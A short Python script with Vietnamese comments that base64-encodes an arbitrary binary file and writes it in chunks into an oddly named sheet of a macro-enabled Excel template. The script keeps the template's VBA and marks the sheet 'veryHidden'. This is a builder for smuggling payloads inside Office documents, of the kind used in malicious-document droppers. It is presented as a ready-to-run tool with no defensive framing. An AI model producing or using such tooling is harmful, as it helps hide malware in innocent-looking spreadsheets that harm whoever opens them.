import base64
import os
from openpyxl import load_workbook

EXCEL_CELL_LIMIT = 32767

def chunk_string(s: str, chunk_size: int) -> list[str]:
    return [s[i:i + chunk_size] for i in range(0, len(s), chunk_size)]

def file_to_xlsm_base64_chunks(input_file: str, template_xlsm: str, output_xlsm: str, chunk_size: int = 30000):
    if chunk_size >= EXCEL_CELL_LIMIT:
        raise ValueError("chunk_size phải < 32767")
    if not output_xlsm.lower().endswith(".xlsm"):
        raise ValueError("output_xlsm phải là .xlsm")
    if not os.path.exists(template_xlsm):
        raise FileNotFoundError(f"Không thấy template: {template_xlsm}")

    with open(input_file, "rb") as f:
        raw = f.read()

    b64 = base64.b64encode(raw).decode("ascii")
    parts = chunk_string(b64, chunk_size)

    # Load template xlsm và GIỮ VBA structure
    wb = load_workbook(template_xlsm, keep_vba=True)

    ws2 = wb.create_sheet(title="Vxbzzx")

    # Lấy/ tạo Sheet1
    if "Vxbzzx" in wb.sheetnames:
        ws = wb["Vxbzzx"]
        ws.delete_rows(1, ws.max_row)  # xoá data cũ (nếu có)
    else:
        ws = wb.active
        ws.title = "Vxbzzx"

    # Ghi chunks vào cột A từ A1
    for i, p in enumerate(parts, start=1):
        ws.cell(row=i, column=1, value=p)

    ws.column_dimensions["A"].width = 120
    ws.freeze_panes = "A2"

    if os.path.exists(output_xlsm):
        os.remove(output_xlsm)

    ws.sheet_state = "veryHidden"
    wb.save(output_xlsm)
    wb.close()
    return output_xlsm

if __name__ == "__main__":
    # python script.py input.bin template.xlsm out.xlsm
    import sys
    if len(sys.argv) != 4:
        print("Usage: python script.py <input_file> <template.xlsm> <out.xlsm>")
        raise SystemExit(1)

    file_to_xlsm_base64_chunks(sys.argv[1], sys.argv[2], sys.argv[3], chunk_size=30000)
    print("Done.")